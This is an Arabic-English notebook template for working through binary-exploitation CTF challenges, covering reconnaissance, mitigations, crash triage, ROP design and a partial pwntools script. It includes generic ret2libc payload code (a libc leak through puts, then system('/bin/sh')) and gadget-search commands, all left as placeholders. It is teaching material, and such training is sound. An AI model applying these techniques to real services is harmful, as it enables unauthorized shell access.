---
title: "PWN Ultimate Notebook"
date: 2026-09-20
draft: false
tags:
  - pwn
  - binary-exploitation
---

# 🔴 PWN Ultimate Notebook — `{{CHALLENGE_NAME}}`

> [!abstract] Mental Model — قاعدة الدفتر
> ما تبدأش بالـ payload. ابدأ بالحالة اللي عايز توصل لها.
> بعدين اسأل: إيه اللي بإيدي؟ إيدي وصلت فين؟ إيه اللي اتكسر؟ بقى معايا إيه؟ أقدر أعمل بيه إيه؟ وإيه أصغر تجربة تثبت اللي أنا فاكره؟

$$\text{Current State} \rightarrow \text{Primitive} \rightarrow \text{Control} \rightarrow \text{Constraints} \rightarrow \text{Desired State} \rightarrow \text{Experiment} \rightarrow \text{Exploit}$$

> [!warning] قواعد الكتابة
> - افصل **Observation** عن **Interpretation**: `RDI = 0x601060` هي Observation؛ أما `RDI controlled` فاستنتاج يحتاج إثبات.
> - كل فرضية لها رقم مستقل. **ما تمسحش الفرضيات الغلط** — سجّل ليه اترفضت.
> - قبل كل Debugging Experiment اكتب **Prediction**. بعده اكتب **Result** الحقيقي → **Conclusion** → **Next Question**.
> - **Crash ≠ Exploit**. اكتب: `Root Cause → Primitive → Capability → Impact`.
> - في ROP فكر في كل Gadget كـ **State Transition**: إيه اللي بيتغير في registers و RSP؟

---

## 📋 فهرس سريع

- [[#§0 — بيانات التحدي والبيئة]]
- [[#§1 — Reconnaissance]]
- [[#§2 — Mitigations]]
- [[#§3 — Attack Surface & Data Flow]]
- [[#§4 — Bug Discovery & Root Cause]]
- [[#§5 — Hypothesis Log]]
- [[#§6 — Crash Triage Log]]
- [[#§7 — Control Proof]]
- [[#§8 — Primitive Identification]]
- [[#§9 — Desired State]]
- [[#§10 — Gadget Selection]]
- [[#§11 — ROP State Machine]]
- [[#§12 — Payload Design]]
- [[#§13 — Failed Attempts]]
- [[#§14 — Mitigation → Capability → Strategy]]
- [[#§15 — Primitive → Capability → Impact]]
- [[#§16 — Reliability]]
- [[#§17 — Debugger Evidence Log]]
- [[#§18 — Alternative Paths]]
- [[#§19 — Final Understanding]]
- [[#§20 — Open Questions]]
- [[#§21 — Lessons Learned]]
- [[#§22 — Next Challenge Prep]]
- [[#🛠 Exploit Template (pwntools)]]

---

## §0 — بيانات التحدي والبيئة

> [!info] Context
> اكتب اللي تعرفه **واللي مش عارفه**. وجود Unknowns طبيعي ومفيد.

### بيانات التحدي

| البند | إجابتك |
|---|---|
| اسم التحدي | |
| اسم الـ Binary | |
| مصدر التحدي (CTF / Lab / Real) | |
| Architecture | ☐ x86  ☐ x64  ☐ ARM  ☐ AARCH64 |
| نظام التشغيل / البيئة | |
| Source Code موجود؟ | ☐ Yes  ☐ No |
| Symbols / Debug info؟ | ☐ Full  ☐ Stripped  ☐ Partial |
| libc version | |
| Compiler / Version | |
| الهدف المطلوب نهائياً | |

### Checksec Output

```
$ checksec --file=BINARY
[*] Paste output here
```

### Known vs Unknown

| Known (مؤكد) | Unknown (يحتاج إثبات) |
|---|---|
| | |
| | |
| | |

### Checklist أولي

- [ ] اسم التحدي والـ binary إيه؟
- [ ] Architecture إيه؟
- [ ] OS و Environment إيه؟
- [ ] Source موجود ولا لأ؟ Symbols موجودة ولا stripped؟
- [ ] Version / Compiler / libc لو مهمين؟
- [ ] التحدي طالب مني إيه في الآخر؟
- [ ] إيه الـ assumptions اللي أنا عارفها من وصف التحدي؟ وإيه اللي لازم أثبته بنفسي؟

**ملاحظات:**

```

```

---

## §1 — Reconnaissance

> [!note] الهدف
> افهم البرنامج كـ system: من فين بيبدأ؟ إيه الـ inputs؟ الـ data بتتحرك لفين؟

### Checklist فهم أولي

- [ ] البرنامج بيبدأ منين؟ `main` ولا Entry Point مختلف؟
- [ ] إيه الـ inputs اللي أقدر أتحكم فيها؟ `stdin` / `argv` / `file` / `network` / `environment`؟
- [ ] الـ input بيدخل منين وبيتحرك لفين؟
- [ ] إيه الـ functions المهمة؟
- [ ] إيه الـ strings أو symbols اللي بتدي hints عن الهدف؟
- [ ] هل فيه function اسمها `win` أو `usefulFunction` أو sink واضح؟
- [ ] إيه الـ API / syscall / library function اللي ممكن تكون مهمة؟
- [ ] هل فيه data أو pointer أو function pointer شكله interesting؟

### Commands Log

| الأداة / الأمر | ليه استخدمته؟ | إيه اللي اتعلمته؟ |
|---|---|---|
| `file BINARY` | | |
| `checksec --file=BINARY` | | |
| `strings BINARY \| grep -i ...` | | |
| `readelf -s BINARY` | | |
| `objdump -d BINARY \| less` | | |
| `ltrace ./BINARY` | | |
| `strace ./BINARY` | | |
| Ghidra / r2 / IDA | | |
| | | |
| | | |

### Key Functions Map

```
main()
  └── func_A()   → [description]
  └── func_B()   → [description / potential sink]
       └── vuln_func()  ← INPUT REACHES HERE
```

### Interesting Symbols / Strings

```
[paste output of: strings BINARY | grep -E "win|system|sh|flag|exec"]
```

**ملاحظات:**

```

```

---

## §2 — Mitigations

> [!warning] المنهجية الصحيحة
> ما تحفظش «NX = ROP». اسأل: الـ mitigation شالت مني **capability** إيه؟ وإيه البديل اللي لسه موجود؟

### جدول الـ Mitigations

| Mitigation | الحالة | إيه اللي بتمنعه/تغيره؟ | إيه البديل المحتمل؟ |
|---|---|---|---|
| **NX / DEP** | ☐ ON  ☐ OFF | | |
| **PIE** | ☐ ON  ☐ OFF | | |
| **Stack Canary** | ☐ ON  ☐ OFF | | |
| **RELRO** | ☐ Full  ☐ Partial  ☐ None | | |
| **ASLR** | ☐ ON  ☐ OFF | | |
| **FORTIFY** | ☐ ON  ☐ OFF | | |
| **CFI / CET** | ☐ ON  ☐ OFF | | |
| **Shadow Stack** | ☐ ON  ☐ OFF | | |

### Checklist تحليل الـ Mitigations

- [ ] هل NX مفعّل؟ لو آه، هل injected code على stack/heap ينفع يتنفذ؟
- [ ] هل PIE مفعّل؟ لو آه، هل عناوين الـ main binary ثابتة؟ هل محتاج leak؟
- [ ] هل Stack Canary موجود؟ لو آه، هل الـ overflow هيكسره قبل الوصول للـ return address؟
- [ ] إيه حالة RELRO؟ هل GOT strategy ممكنة؟
- [ ] هل فيه ASLR؟ إيه المناطق اللي عناوينها بتتغير؟
- [ ] هل فيه CFI أو Shadow Stack أو CET أو mitigations إضافية؟
- [ ] كل mitigation شالت مني capability إيه تحديدًا؟

**ملاحظات:**

```

```

---

## §3 — Attack Surface & Data Flow

> [!info] الهدف
> ارسم مسار الـ attacker-controlled data من الـ input حتى الـ sink.

### Checklist

- [ ] أنا بإيدي إيه بالظبط؟ Bytes؟ length؟ pointer؟ index؟ object fields؟
- [ ] إيدي وصلت لفين؟ Stack؟ Heap؟ Global؟ Function pointer؟ vtable؟ return address؟
- [ ] الـ input بيتعمله إيه قبل ما يوصل للـ sink؟ Copy؟ Parse؟ Decode؟ Cast؟ Arithmetic؟
- [ ] فين أول نقطة بتتحول فيها الـ attacker-controlled data لحاجة حساسة؟
- [ ] فين الـ trust boundary؟
- [ ] إيه القيمة أو الـ pointer اللي أنا مهتم بيه؟ مين بيكتبه؟ مين بيقرأه؟ مين بيستخدمه؟

### Data Flow Map

| المرحلة | القيمة / الـ object | مين بيتحكم؟ | إيه اللي بيحصل؟ |
|---|---|---|---|
| Input entry | | Attacker | |
| | | | |
| | | | |
| | | | |
| **Sink** | | | **← TARGET** |

### ASCII Flow Diagram

```
[Attacker Input]
       │
       ▼
  [read() / scanf() / recv()]
       │
       ├─ [Validation / Parsing] ← تحقق: هل فيه checks؟
       │
       ▼
  [Buffer / Object at 0x????]     ← على Stack / Heap / .bss؟
       │
       ▼
  [SENSITIVE OPERATION]           ← return / call / write
```

**ملاحظات:**

```

```

---

## §4 — Bug Discovery & Root Cause

> [!bug] قاعدة أساسية
> **Crash ≠ Bug ≠ Primitive ≠ Exploit.** وثّق كل خطوة منفصلة.

### Checklist

- [ ] إيه الـ invariant اللي المفروض يفضل صحيح؟
- [ ] إيه اللي البرنامج افترضه عن الـ input؟
- [ ] إزاي الـ attacker كسر الافتراض ده؟
- [ ] هل المشكلة `bounds`؟ `lifetime`؟ `type`؟ `integer arithmetic`؟ `format string`؟ `pointer validation`؟

### Bug Classification

| العنصر | إجابتك |
|---|---|
| **Bug Type** | ☐ Stack BOF  ☐ Heap BOF  ☐ UAF  ☐ Format String  ☐ Integer Overflow  ☐ Type Confusion  ☐ Other: |
| **Vulnerable Function** | |
| **Vulnerable Line / Offset** | |
| **الـ invariant اللي اتكسر** | |
| **افتراض البرنامج الخاطئ** | |
| **Root Cause (جملة واحدة)** | |

### Code Snippet (Vulnerable Path)

```c
// C pseudo-code من الـ Ghidra / IDA
void vuln_func(char *input) {
    char buf[64];          // ← fixed size
    strcpy(buf, input);    // ← no bounds check → OVERFLOW
}
```

### Assembly Annotation

```asm
; objdump -d BINARY | grep -A20 "vuln_func"
; rsp-relative layout:
;   [rsp+0x00] = buf[0]     (64 bytes)
;   [rsp+0x40] = saved rbp
;   [rsp+0x48] = return address  ← TARGET
```

### Stack Layout (عند الـ Overflow)

```
HIGH ADDR
┌─────────────────────────┐
│     return address      │  ← [rsp + 0x48]  ← OVERWRITE HERE
├─────────────────────────┤
│       saved RBP         │  ← [rsp + 0x40]
├─────────────────────────┤
│     buf[63..0]          │  ← [rsp + 0x00]  ← INPUT STARTS HERE
└─────────────────────────┘
LOW ADDR
```

**ملاحظات:**

```

```

---

## §5 — Hypothesis Log

> [!tip] قاعدة مهمة
> كل فرضية لها رقم مستقل. **ما تمسحش الفرضيات الغلط** — سجّل ليه اترفضت. الفرضية المرفوضة بتضيّق الـ search space.

---

### H-001

> [!abstract] الفرضية
> **Hypothesis:** 
> 
> **Reasoning:** 

**Prediction:** لو الفرضية صح، أتوقع أشوف:
```

```

**Experiment:**
```bash
# الأمر / الخطوة

```

**Actual Result:**
```

```

**Conclusion:** ☐ مقبولة  ☐ مرفوضة  ☐ تحتاج مزيد من التحقق

**Why Rejected (لو مرفوضة):**

**Next Question:**

---

### H-002

> [!abstract] الفرضية
> **Hypothesis:** 
> 
> **Reasoning:** 

**Prediction:**
```

```

**Experiment:**
```bash

```

**Actual Result:**
```

```

**Conclusion:** ☐ مقبولة  ☐ مرفوضة  ☐ تحتاج مزيد من التحقق

**Why Rejected:**

**Next Question:**

---

### H-003

> [!abstract] الفرضية
> **Hypothesis:** 
> 
> **Reasoning:** 

**Prediction:**
```

```

**Experiment:**
```bash

```

**Actual Result:**
```

```

**Conclusion:** ☐ مقبولة  ☐ مرفوضة  ☐ تحتاج مزيد من التحقق

**Why Rejected:**

**Next Question:**

---

*[أضف فرضيات إضافية بنفس الهيكل: H-004, H-005, ...]*

---

## §6 — Crash Triage Log

> [!bug] حصل Crash؟ طيب وبعدين؟
> الـ Crash مش نهاية — هو بداية. اسأل: أنا سببت الـ crash منين؟ إيه اللي تحكمت فيه؟

### Checklist

- [ ] إيه الـ register/address اللي سبّب الـ crash؟
- [ ] هل القيمة دي منّي (attacker-controlled)؟
- [ ] إيه الـ instruction اللي فشلت؟ `call [rax]`؟ `jmp rdx`؟ `mov [rax], rbx`؟
- [ ] هل الـ crash على stack؟ heap؟ في code segment؟
- [ ] هل الـ offset ثابت ولا بيتغير؟
- [ ] إيه الـ signal اللي وصل؟ `SIGSEGV`؟ `SIGBUS`؟ `SIGABRT` (= canary)؟

### Crash Details

| العنصر | القيمة |
|---|---|
| **Signal** | |
| **Faulting Address** | |
| **Faulting Instruction** | |
| **RIP at crash** | |
| **RSP at crash** | |
| **RBP at crash** | |
| **Attacker-controlled?** | ☐ Yes  ☐ No  ☐ Partial |

### Register State at Crash

```
pwndbg> i r
rax = 0x????????
rbx = 0x????????
rcx = 0x????????
rdx = 0x????????
rsi = 0x????????
rdi = 0x????????
rsp = 0x????????
rbp = 0x????????
rip = 0x????????
```

### Crash Log Table

| Input Size | Signal | Faulting Addr | Controlled? | Notes |
|---|---|---|---|---|
| | | | | |
| | | | | |
| | | | | |
| | | | | |

### GDB Session

```
pwndbg> r < <(python3 -c "import sys; sys.stdout.buffer.write(b'A'*???)")
pwndbg> bt
pwndbg> x/20gx $rsp
```

**ملاحظات:**

```

```

---

## §7 — Control Proof

> [!success] إثبات الـ Control
> إثبات إن الـ attacker بيتحكم في قيمة معينة مش بيعني إنه يقدر يستغلها. وثّق الإثبات بدقة.

### Checklist

- [ ] إزاي أثبت إن RIP / RBP / [ptr] تحت سيطرتي؟
- [ ] إيه الـ offset الدقيق من بداية الـ input لحد الـ target؟
- [ ] هل الـ offset ثابت في كل run؟
- [ ] هل الـ control كامل (64-bit / 32-bit) ولا جزئي؟
- [ ] إيه القيود على القيمة؟ (null bytes؟ newline؟ printable only؟)

### Offset Discovery

```bash
# طريقة 1: cyclic pattern
python3 -c "from pwn import *; print(cyclic(200))" > /tmp/pattern.txt
gdb ./BINARY -ex "r < /tmp/pattern.txt" -ex "x/gx \$rsp" -ex "quit"
python3 -c "from pwn import *; print(cyclic_find(0x????????))"

# طريقة 2: manual binary search
```

### Proof of Control

| Target | Offset من بداية الـ input | القيمة اللي حطيتها | القيمة اللي شفتها في GDB | Controlled؟ |
|---|---|---|---|---|
| `return address` | | `0xdeadbeef` | | ☐ Yes  ☐ No |
| `saved rbp` | | | | |
| `function ptr` | | | | |

### GDB Evidence

```
pwndbg> p $rip
$1 = 0xdeadbeef    ← ✅ CONTROLLED
```

**Constraints على الـ Value:**

| Constraint | تفسير |
|---|---|
| ☐ No null bytes (`\x00`) | البيانات بتتقطع عند الـ null |
| ☐ No newlines (`\x0a`) | `fgets` بتوقف عنده |
| ☐ Printable only | filtering أو scanf format |
| ☐ Must be valid address | dereference قبل الاستخدام |
| ☐ Other: | |

**ملاحظات:**

```

```

---

## §8 — Primitive Identification

> [!info] Primitive مش Exploit
> الـ primitive هو الـ building block. من الـ primitive بنبني الـ capability.

### Primitive المكتشفة

| Primitive | موجودة؟ | الدليل | القيود |
|---|---|---|---|
| **Arbitrary Write** (write-what-where) | ☐ Yes  ☐ No | | |
| **Arbitrary Read** | ☐ Yes  ☐ No | | |
| **PC Control** (RIP/EIP control) | ☐ Yes  ☐ No | | |
| **Relative Write** (controlled offset) | ☐ Yes  ☐ No | | |
| **Heap Alloc Control** | ☐ Yes  ☐ No | | |
| **Leak Primitive** (info disclosure) | ☐ Yes  ☐ No | | |
| **UAF** | ☐ Yes  ☐ No | | |
| **Type Confusion** | ☐ Yes  ☐ No | | |

### Primitive → Capability Chain

```
[Primitive]
    │
    ▼
[Capability 1] → مثال: "arbitrary write → overwrite GOT"
    │
    ▼
[Capability 2] → مثال: "overwrite GOT → redirect execution"
    │
    ▼
[Impact]       → مثال: "RCE / shell"
```

### Constraints على الـ Primitive

```
- Max write size: ??? bytes
- Alignment requirement: ???
- Address range: ???
- Times callable: once / multiple
```

**ملاحظات:**

```

```

---

## §9 — Desired State

> [!tip] ابدأ من النهاية
> لا تبدأ بالـ gadgets. ابدأ بـ «أنا عايز الـ CPU / Memory يكون في الحالة دي بالظبط».

### Target State

| Register / Memory | القيمة المطلوبة | ليه؟ |
|---|---|---|
| `RIP` | | |
| `RDI` | | `arg1 لـ system()` |
| `RSI` | | `arg2` |
| `RDX` | | `arg3` |
| `RSP` | | stack alignment |
| `[GOT entry]` | | |
| **الـ Stack alignment** | `RSP % 16 == 0` قبل `call system` | ABI requirement |

### الحالة الحالية vs المطلوبة

```
Current State:
  RIP = somewhere in main/vuln
  RDI = garbage
  RSP = 0x????????

Desired State:
  RIP = system()  OR  one_gadget
  RDI = ptr → "/bin/sh"
  RSP aligned to 16 bytes
```

### Checklist

- [ ] إيه الـ syscall / function اللي أنا عايز أوصله؟
- [ ] إيه الـ arguments اللي المحتاجها؟ (RDI / RSI / RDX)
- [ ] هل محتاج libc leak عشان أعرف عناوينها؟
- [ ] هل الـ stack alignment شرط (ABI: RSP % 16 == 0 قبل call)؟
- [ ] One gadget ممكن ولا لازم full ROP chain؟

```bash
# one_gadget check
one_gadget libc.so.6
```

**ملاحظات:**

```

```

---

## §10 — Gadget Selection

> [!abstract] فلسفة الـ Gadgets
> **ما تقولش «أنا عايز أعمل ROP».** قول: «أنا عايز أغيّر الـ CPU state من هنا لهنا، وإيه أقل مجموعة instructions موجودة أصلًا تقدر تعمل التحويل ده؟»

### Search Commands

```bash
# ROPgadget
ROPgadget --binary BINARY --rop --chain "execve"
ROPgadget --binary BINARY | grep "pop rdi"
ROPgadget --binary BINARY | grep "ret"

# ropper
ropper -f BINARY --search "pop rdi"

# pwntools ROP
python3 -c "from pwn import *; r=ROP('./BINARY'); print(r.find_gadget(['pop rdi', 'ret']))"

# في libc (بعد الـ leak)
ROPgadget --binary libc.so.6 | grep "pop rdi"
```

### Gadget Table

| الهدف من الـ Gadget | العنوان | الـ Assembly | القيود / Side Effects |
|---|---|---|---|
| `pop rdi; ret` | `0x????????` | `pop rdi; ret` | |
| `pop rsi; pop r15; ret` | `0x????????` | | يحتاج filler لـ r15 |
| `pop rdx; ret` | `0x????????` | | |
| `ret` (alignment fix) | `0x????????` | `ret` | لـ stack alignment فقط |
| `syscall` | `0x????????` | `syscall` | |
| `pop rax; ret` | `0x????????` | | |
| `leave; ret` (stack pivot) | `0x????????` | | |
| `call system@plt` / `jmp system` | `0x????????` | | |

### Notes

```

```

---

## §11 — ROP State Machine

> [!warning] ROP كـ State Machine
> كل gadget = State Transition. لا تفكر في الـ chain كـ «قائمة addresses».
> فكر: الـ CPU كان في state X → بعد الـ gadget هيكون في state Y.

### Chain Design

```
┌─────────────────────────────────────────────────────────┐
│                    PAYLOAD LAYOUT                        │
├───────────┬─────────────────┬────────────────────────────┤
│  Offset   │    Value        │         Effect             │
├───────────┼─────────────────┼────────────────────────────┤
│ +0x00     │ "A" * PADDING   │ fills buffer               │
│ +0x??     │ "B" * 8         │ overwrites saved RBP       │
│ +0x??     │ pop_rdi_ret     │ STATE: RIP → pop_rdi       │
│ +0x??     │ addr_of_binsh   │ STATE: RDI = "/bin/sh"     │
│ +0x??     │ ret_gadget      │ STATE: align RSP           │
│ +0x??     │ system_addr     │ STATE: RIP → system()      │
└───────────┴─────────────────┴────────────────────────────┘
```

### State Transition Table

| Step | Gadget/Value | RSP قبل | RSP بعد | Registers المتأثرة | State المحقق |
|---|---|---|---|---|---|
| 1 | `pop rdi; ret` @ `0x????` | +0x?? | +0x?? +8 | RDI = next | RDI set |
| 2 | `addr("/bin/sh")` | consumed by pop | | | RDI = "/bin/sh" |
| 3 | `ret` (align) | +0x?? | +0x?? +8 | none | RSP aligned |
| 4 | `system()` | | | | **SHELL** |

### Stack Alignment Check

```
> [!bug] Stack Alignment Trap
> قبل أي `call` لـ system() أو printf() → RSP لازم يكون divisible by 16.
> لو مش متأكد: أضف gadget `ret` قبل الـ call مباشرةً.
```

```python
# فحص الـ alignment في pwntools
log.info(f"RSP at call: {hex(stack_addr)}")
assert stack_addr % 16 == 0, "STACK NOT ALIGNED!"
```

### Chain Iterations

#### Iteration 1

```python
chain_v1 = flat([
    b"A" * OFFSET,
    p64(POP_RDI),
    p64(BIN_SH),
    p64(SYSTEM),
])
```

**Result:** 
**Issue:**

#### Iteration 2

```python
chain_v2 = flat([
    b"A" * OFFSET,
    p64(POP_RDI),
    p64(BIN_SH),
    p64(RET),       # alignment fix
    p64(SYSTEM),
])
```

**Result:**

---

## §12 — Payload Design

> [!info] Payload = Assembled Plan
> الـ payload هو الخطوة الأخيرة، مش الأولى.

### Payload Structure

```
[PADDING] + [LEAK STAGE (optional)] + [ROP CHAIN]
   │               │                      │
   ▼               ▼                      ▼
fills buf     gets libc base         achieves desired state
```

### Leak Strategy (لو PIE / ASLR شغّال)

| الهدف من الـ Leak | الـ Technique | العنوان المستهدف |
|---|---|---|
| libc base | `puts(got['puts'])` → calc offset | `puts@got` |
| binary base | leak from `.text` or `_start` | |
| heap base | leak heap pointer from output | |

```python
# Leak calculation example
leaked_puts = u64(io.recv(6).ljust(8, b'\x00'))
libc_base   = leaked_puts - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
log.success(f"libc @ {hex(libc_base)}")
```

### Final Payload Assembly

```python
offset    = ???
padding   = b"A" * offset

# Stage 1: Leak
stage1 = flat([
    padding,
    p64(POP_RDI),
    p64(exe.got['puts']),
    p64(exe.plt['puts']),
    p64(exe.sym['main']),   # return to main for stage 2
])

# Stage 2: Shell
stage2 = flat([
    padding,
    p64(POP_RDI),
    p64(bin_sh_addr),
    p64(RET_GADGET),        # alignment
    p64(system_addr),
])
```

### Constraints على الـ Payload

| Constraint | التعامل معه |
|---|---|
| No null bytes | encode / avoid addresses with `\x00` |
| Max length: `???` bytes | prioritize compact chain |
| Newline terminates | avoid `\x0a` or use recv carefully |
| | |

**ملاحظات:**

```

```

---

## §13 — Failed Attempts

> [!warning] الفشل جزء من البحث
> ما تمسحش المحاولات الفاشلة. كل محاولة لازم تجاوب سؤال أو تستبعد فرضية.

| Attempt # | الفكرة | Prediction | النتيجة الفعلية | ليه فشلت؟ | إيه اللي اتعلمته؟ |
|---|---|---|---|---|---|
| 1 | | | | | |
| 2 | | | | | |
| 3 | | | | | |
| 4 | | | | | |
| 5 | | | | | |
| 6 | | | | | |

**ملاحظات تفصيلية على أهم الفشل:**

```

```

---

## §14 — Mitigation → Capability → Strategy

> [!info] Framework
> كل mitigation = capability اتشالت منك. بس بتفتح سؤال: «إيه اللي لسه ممكن؟»

| Mitigation | Capability اللي اتشالت | إيه اللي لسه ممكن؟ | الاستراتيجية الناتجة |
|---|---|---|---|
| NX = ON | shellcode injection | ROP / ret2libc / code reuse | |
| PIE = ON | fixed binary addresses | leak → calc base → use symbols | |
| Canary = ON | direct stack smash | leak canary / avoid overwrite / format string | |
| Full RELRO = ON | GOT overwrite | overwrite other writable targets | |
| ASLR = ON | predictable addresses | leak / brute force (32-bit) / partial overwrite | |
| CFI / CET = ON | simple ROP | SROP / DOP / data-only attacks | |

### Checklist

- [ ] لو NX شال execution من stack، إيه code reuse المتاح؟
- [ ] لو PIE شغّل randomization للـ binary، إيه leak اللي أحتاجه؟
- [ ] لو Canary موجود، هل أقدر أتجنب الكتابة عليه أو أحتاج leak؟
- [ ] لو GOT strategy مش متاحة، إيه targets تانية ممكنة؟
- [ ] لو CFI/Shadow Stack موجود، إيه primitive أو path مختلف ممكن يفضل؟

**ملاحظات:**

```

```

---

## §15 — Primitive → Capability → Impact

> [!warning] ما تقفزش من «bug» إلى «RCE»
> اكتب السلسلة كاملة بدليل على كل خطوة.

| المرحلة | الوصف | الدليل (GDB / output) |
|---|---|---|
| **Bug** | e.g. Stack buffer overflow in `vuln()` | `checksec` + source |
| **Primitive** | e.g. Arbitrary write, 8 bytes, on stack | GDB: controlled RIP = `0xdeadbeef` |
| **Capability** | e.g. Control execution flow | GDB: `ret` jumps to gadget |
| **Constraint** | e.g. No null bytes, one shot | payload testing |
| **Desired State** | e.g. `rdi = &"/bin/sh"`, `rip = system()` | ROP chain design |
| **Impact** | e.g. RCE → interactive shell | `id; whoami` in shell |

### Example Thinking Chain

```
Stack overflow
    → saved RIP control (arbitrary write on stack)
    → control execution flow (capability)
    → leak libc via puts@plt (overcome ASLR)
    → ret2system("/bin/sh") (desired state)
    → shell (impact)
```

---

## §16 — Reliability

> [!bug] هل الحل صدفة ولا ثابت؟
> الـ exploit الغير موثوق مش exploit — هو مجرد crash محظوظ.

### Checklist

- [ ] اشتغل كام مرة من كام؟
- [ ] هل اشتغل بعد إعادة تشغيل البرنامج؟
- [ ] هل ASLR بيغير حاجة؟
- [ ] هل الـ timing أو environment بيأثر؟
- [ ] هل فيه race أو nondeterminism؟
- [ ] إيه الـ assumptions اللي exploit بيعتمد عليها؟
- [ ] إيه أقل تغيير في environment ممكن يكسره؟

### Reliability Log

| Run # | Local / Remote | نجح؟ | لو فشل، ليه؟ |
|---|---|---|---|
| 1 | Local | | |
| 2 | Local | | |
| 3 | Remote | | |
| 4 | Remote | | |
| 5 | Remote | | |

**Success Rate:** `__ / __`

**Identified Flakiness Causes:**

```

```

---

## §17 — Debugger Evidence Log

> [!tip] GDB Discipline
> كل مرة تقف في GDB اسأل: أنا واقف هنا **ليه**؟ إيه الفرضية اللي باختبرها؟

### Checklist قبل كل Breakpoint

- [ ] أنا واقف هنا ليه؟ إيه الفرضية اللي باختبرها؟
- [ ] إيه الـ instruction اللي هتنفذ دلوقتي؟
- [ ] إيه الـ register اللي يهمني؟
- [ ] القيمة دي جت منين؟
- [ ] مين بيتحكم فيها؟
- [ ] الـ instruction الجاية هتستخدمها إزاي؟
- [ ] إيه المتوقع يحصل لو عملت `si` / `ni`؟
- [ ] هل اللي شفته يثبت الـ hypothesis ولا لأ؟

### Evidence Table

| Breakpoint / Address | Prediction | Actual Register State | Conclusion |
|---|---|---|---|
| `b *vuln_func+??` | | | |
| `b *main+??` | | | |
| `b *0x????????` | | | |
| | | | |

### GDB Quick Reference

```bash
# pwndbg essential commands
context                        # full context view
x/20gx $rsp                   # examine stack
x/s $rdi                      # examine string at rdi
p system                       # print address
find $rsp, +0x1000, "/bin/sh" # search memory
vmmap                          # memory map
got                            # GOT table
plt                            # PLT entries
rop                            # ROP gadgets (pwndbg)
telescope $rsp 20             # annotated stack view
```

### Session Logs

```
# Session 1 — [Date / Purpose]
pwndbg> 

# Session 2 — [Date / Purpose]  
pwndbg> 
```

---

## §18 — Alternative Paths

> [!info] لو الطريقة دي ما نفعتش؟
> الـ researcher الكويس دايما عنده Plan B.

### Checklist

- [ ] هل فيه helper function تحقق جزء من الـ desired state؟
- [ ] هل أقدر أعمل direct call؟
- [ ] هل أقدر أستخدم ROP مختلف؟
- [ ] هل فيه ret2csu / ret2libc / ret2plt / SROP أو technique أخرى مناسبة؟
- [ ] هل primitive مختلفة ممكن تكون أقوى؟
- [ ] هل فيه leak يفتح path أبسط؟
- [ ] إيه الجزء من الـ exploit الحالي اللي ممكن أعيد استخدامه؟

### Alternative Paths Table

| الطريق البديل | إيه اللي يحققه؟ | إيه اللي ناقص؟ | ليه استخدمته / رفضته؟ |
|---|---|---|---|
| ret2libc | system("/bin/sh") | يحتاج libc leak | |
| one_gadget | shell directly | constraints on regs | |
| ret2csu | arbitrary args setup | يحتاج 2 gadgets | |
| SROP | full register control | يحتاج syscall gadget | |
| GOT overwrite | redirect any call | يحتاج Partial RELRO | |
| Format string leak | bypass PIE/ASLR | يحتاج format string vuln | |
| | | | |

---

## §19 — Final Understanding

> [!success] اشرح التحدي من غير كود
> لو قدرت تشرح الـ state transitions من دماغك من غير ما تبص على الـ script، فأنت فاهم الحل.

### Checklist الفهم الكامل

- [ ] إيه الـ root cause؟
- [ ] إيه الـ broken invariant؟
- [ ] إيه الـ primitive؟
- [ ] أنا بتحكم في إيه بالظبط؟
- [ ] الـ control وصل لفين؟
- [ ] إيه الـ desired state؟
- [ ] إيه الـ constraints؟
- [ ] إيه الـ gadgets اللي استخدمتها وليه؟
- [ ] ليه الـ first attempt فشل؟
- [ ] إيه الدليل اللي أثبت سبب الفشل؟
- [ ] إزاي التعديل الأخير غيّر الـ state؟
- [ ] ليه الـ mitigations أثرت على اختيار التقنية؟
- [ ] إيه الـ capability النهائية؟

### ملخص الخمس سطور

```
Root Cause:     _______________________________________________

Primitive:      _______________________________________________

What I Control: _______________________________________________

Capability:     _______________________________________________

Why It Works:   _______________________________________________
```

### Narrative (اشرح بأسلوبك)

```

```

---

## §20 — Open Questions

> [!question] الحاجات اللي لسه مش فاهمها
> وجود أسئلة مفتوحة مش ضعف — هو self-awareness.

- [ ] 
- [ ] 
- [ ] 
- [ ] 
- [ ] 
- [ ] 
- [ ] 
- [ ] 
- [ ] 
- [ ] 

---

## §21 — Lessons Learned

> [!note] الدروس اللي طلعت بيها
> اكتب الـ generalizable insight، مش بس «عملت كذا وشتغل».

1. 
   
2. 
   
3. 
   
4. 
   
5. 

---

## §22 — Next Challenge Prep

> [!tip] Questions for the Next Challenge

1. إيه الحاجة الجديدة اللي التحدي الجاي ممكن يخليني أتعلمها؟

2. إيه primitive مختلفة محتاج أتعلم أكتشفها؟

3. إيه mitigation جديدة ممكن تقابلني؟

4. إيه جزء من workflow الحالي لازم أطبقه من غير مساعدة؟

5. إيه حاجة من التحدي الحالي عايز أختبرها بطريقة مختلفة؟

---

## 🛠 Exploit Template (pwntools)

> [!abstract] Exploit Pipeline — جاهز للتعديل المباشر

```python
#!/usr/bin/env python3
"""
Challenge : {{CHALLENGE_NAME}}
Binary    : {{BINARY_NAME}}
Arch      : {{x86|x64}}
Author    : {{YOUR_HANDLE}}
Date      : {{DATE}}

Mental Model:
  Current State → Primitive → Control → Constraints → Desired State → Exploit

State:
  - [ ] Offset found
  - [ ] Control proven
  - [ ] Gadgets located
  - [ ] Leak working
  - [ ] Shell obtained
"""

from pwn import *

# ─── Target Configuration ────────────────────────────────────────────────────
BINARY  = "./BINARY"
LIBC    = "./libc.so.6"          # ldd BINARY | grep libc
HOST    = "challenge.ctf.io"
PORT    = 4444

# ─── Context Setup ───────────────────────────────────────────────────────────
context.binary   = exe = ELF(BINARY, checksec=False)
context.log_level = "info"       # debug | info | warning
# context.terminal = ["tmux", "splitw", "-h"]   # uncomment for tmux GDB

try:
    libc = ELF(LIBC, checksec=False)
except:
    libc = None
    log.warning("No libc provided — some calculations may fail")

rop  = ROP(exe)

# ─── Offsets & Constants ─────────────────────────────────────────────────────
OFFSET       = ???           # bytes to overwrite return address
# OFFSET     = cyclic_find(0x????????)   # use after cyclic pattern crash

# ─── Gadgets ─────────────────────────────────────────────────────────────────
POP_RDI  = rop.find_gadget(["pop rdi", "ret"])[0]
POP_RSI  = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]   # adjust if needed
RET      = rop.find_gadget(["ret"])[0]                          # stack alignment

